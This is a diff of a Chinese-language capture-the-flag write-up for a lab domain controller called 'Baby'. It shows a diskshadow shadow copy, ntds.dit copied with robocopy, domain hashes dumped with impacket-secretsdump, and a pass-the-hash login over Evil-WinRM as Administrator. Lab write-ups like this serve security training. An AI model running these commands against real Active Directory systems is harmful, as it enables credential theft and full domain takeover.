@@ -251,26 +251,170 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 #### 然而，尝试使用这个管理员哈希8d992faed38128ae85e95fa35868bb43登录证明成功。
 #### 我们的下一步将是尝试转储域哈希。为了做到这一点，我们将需要NTDS.dit数据库，其中包含Active Directory域对象和凭据。但是，活动文件被锁定并且我们不能直接复制它。因此，我们必须创建当前卷的卷影副本或快照使用diskshadow驱动器。然后我们将能够暴露复制的驱动器并访问NTDS.dit文件，因为它没有被使用。系统蜂巢，我们已经有将提供必要的关键，我们需要解密其内容。
 #### 因此，我们将使用以下脚本，我们将上传到受害机器并命名为backup.txt。这将创建C：驱动器的持久影子副本，并以别名cdrive挂载快照到驱动器E：。
+#### 上传
 ```
-[★]$ vi backup.txt
-[★]$ cat backup.txt
-set verbose on 
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload backup.txt //可上传个空文本
+```
+#### 因为PowerShell 的自动补全 + 编辑器换行的原因：需要单行输入，保证不变形。
+```
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cmd.exe /c "echo set verbose on > backup.txt"
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cmd.exe /c "echo set metadata C:\Windows\Temp\test.cab >> backup.txt"
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cmd.exe /c "echo set context persistent >> backup.txt" 
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cmd.exe /c "echo add volume C: alias cdrive >> backup.txt"
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cmd.exe /c "echo create >> backup.txt"
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cmd.exe /c "echo expose %cdrive% E: >> backup.txt"
+
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> type backup.txt //查看
+set verbose on
 set metadata C:\Windows\Temp\test.cab
 set context persistent
 add volume C: alias cdrive
 create
 expose %cdrive% E:
+
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> diskshadow /s ./backup.txt //执行
+
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  BABYDC,  11/29/2025 9:27:19 AM
+
+-> set verbose on
+-> set metadata C:\Windows\Temp\test.cab
+-> set context persistent
+-> add volume C: alias cdrive
+-> create
+Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.
+<SNIP>
+Alias cdrive for shadow ID {8093eb67-d13a-4fbb-9db3-4e132adeac1f} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {dc167910-53a8-4769-b7eb-7e8de493b0b8} set as environment variable.
+Inserted file Manifest.xml into .cab file test.cab
+Inserted file BCDocument.xml into .cab file test.cab
+Inserted file WM0.xml into .cab file test.cab
+Inserted file WM1.xml into .cab file test.cab
+Inserted file WM2.xml into .cab file test.cab
+Inserted file WM3.xml into .cab file test.cab
+Inserted file WM4.xml into .cab file test.cab
+Inserted file WM5.xml into .cab file test.cab
+Inserted file WM6.xml into .cab file test.cab
+Inserted file WM7.xml into .cab file test.cab
+Inserted file WM8.xml into .cab file test.cab
+Inserted file WM9.xml into .cab file test.cab
+Inserted file WM10.xml into .cab file test.cab
+Inserted file DisC9A7.tmp into .cab file test.cab
+
+Querying all shadow copies with the shadow copy set ID {dc167910-53a8-4769-b7eb-7e8de493b0b8}
+
+	* Shadow copy ID = {8093eb67-d13a-4fbb-9db3-4e132adeac1f}		%cdrive%
+		- Shadow copy set: {dc167910-53a8-4769-b7eb-7e8de493b0b8}	%VSS_SHADOW_SET%
+		- Original count of shadow copies = 1
+		- Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
+		- Creation time: 11/29/2025 9:27:42 AM
+		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+		- Originating machine: BabyDC.baby.vl
+		- Service machine: BabyDC.baby.vl
+		- Not exposed
+		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+		- Attributes:  No_Auto_Release Persistent Differential
+
+Number of shadow copies listed: 1
+-> expose %cdrive% E:
+-> %cdrive% = {8093eb67-d13a-4fbb-9db3-4e132adeac1f}
+The shadow copy was successfully exposed as E:\.
+->
 ```
-#### 上传
+#### 当它完成时，我们将有一个C：驱动器的完整副本，暴露为E：。由于它目前没有使用，我们可以复制NTDS。Dit文件与robocopy到我们的当前目录
 ```
-*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload backup.txt
-                                        
-Info: Uploading /home/syareya55/Baby/backup.txt to C:\Users\Caroline.Robinson\Documents\backup.txt
-                                        
-Data: 172 bytes of 172 bytes copied
-                                        
-Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> robocopy /b E:\Windows\ntds . ntds.dit
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Saturday, November 29, 2025 9:36:41 AM
+   Source : E:\Windows\ntds\
+     Dest : C:\Users\Caroline.Robinson\Documents\
+
+    Files : ntds.dit
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+<SNIP>
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :   16.00 m   16.00 m         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+
+
+   Speed :           51,150,048 Bytes/sec.
+   Speed :            2,926.829 MegaBytes/min.
+   Ended : Saturday, November 29, 2025 9:36:41 AM
 ```
-#### 现在我们可以在使用diskshadow的机器上运行脚本了。
+```
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> ls
+
+
+    Directory: C:\Users\Caroline.Robinson\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/29/2025   9:26 AM            141 backup.txt
+-a----        11/29/2025   9:27 AM       16777216 ntds.dit
+-a----        11/29/2025   8:40 AM          49152 sam
+-a----        11/29/2025   8:41 AM       20480000 system
+```
+#### 下载到本地
+```
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download ntds.dit
+                                        
+Info: Downloading C:\Users\Caroline.Robinson\Documents\ntds.dit to ntds.dit
+                                        
+Info: Download successful!
+```
+#### 现在我们可以尝试通过再次使用secretsdump来转储域哈希值
+```
+[★]$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
+<SNIP>
+```
+#### 这一次，我们看到了管理员的域哈希，我们可以使用它来尝试传递哈希以登录
+```
+[★]$ evil-winrm -i baby.vl -u 'administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+```
+#### 导航到管理员桌面来查找root.txt
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        11/29/2025   8:29 AM             34 root.txt
+```
 
 
